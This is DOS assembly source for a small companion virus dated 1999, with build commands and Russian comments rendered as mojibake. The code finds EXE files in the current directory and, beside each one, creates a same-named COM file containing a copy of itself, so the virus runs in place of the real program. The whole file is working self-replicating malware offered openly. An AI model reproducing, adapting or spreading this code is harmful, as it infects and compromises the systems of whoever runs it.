   ;*ë«®  : C.43 by Vov04k@
   ;‘â «® : C.41 by Duke/SMF  (22.05.99)

   ;…á«¨ ¢ â¥ªãé¥¬ ª â «®£¥ ¥áâì EXE-ä ©« (¯¥à¢ë©, ¥á«¨ ¨å ¬®£®),
   ;¨ ã ¥£® ¥â ®¤®¨¬¥®£® COM, â® ¯®à §¨¬ (á®§¤ ¤¨¬ COM) ¨ ®â¢ «¨¬.
   ;“¯à ¢«¥¨ï ¥ ¢®§¢à é ¥¬, ¨ç¥àâ  ¥ ¯à®¢¥àï¥¬ :)
   ;Œ®¨ ª®¬¬¥â à¨¨ ®â¬¥ç¥ë "FD"
   ; tasm comp41.asm /m2
   ; tlink comp41.obj /t

   .Model Tiny
   .code
   .386
   org 100h
   start:
   E_Mask db '*.e*'
          mov  di,9eh
          xchg cx,ax              ;cx=0
          mov  ah,4eh
   NewFile:
          mov dx,si
          int 21h
   ;       jnb TestFile           ;FD :   ¥ ¯«îãâì «¨  ¬   ¯à®¢¥àªã ???
   ;@Exit:                        ;FD : ¥á«¨ ä ©« ¥áâì - ¯®à §¨¬ !
   ;       ret                    ;FD :     ¥â ¨ áã¤  ¥â ;-)

   TestFile:
          mov dx,di
          mov ax,5b2eh
   @1:
          scasb
          jne @1
          mov dword ptr [di],' moc'
   @2:
          int 21h
          jc @Exit          ;ã©¤¥¬   ¢ëå®¤ ¢á¥ à ¢® ¯®¢â®à®£® ¯®¨áª  ¥â
          xchg bx,ax
          mov ah,40h
          mov cl,MyLength
   ;@3:                           ;FD : íâ® ¡ë« ¬ãá®à ª ª®©-â®
          jmp short NewFile
   @Exit:                         ;FD : á ¬®¥ ¬¥áâ® :)
          ret                     ;
   ;---
   MyLength equ $-start
   end start
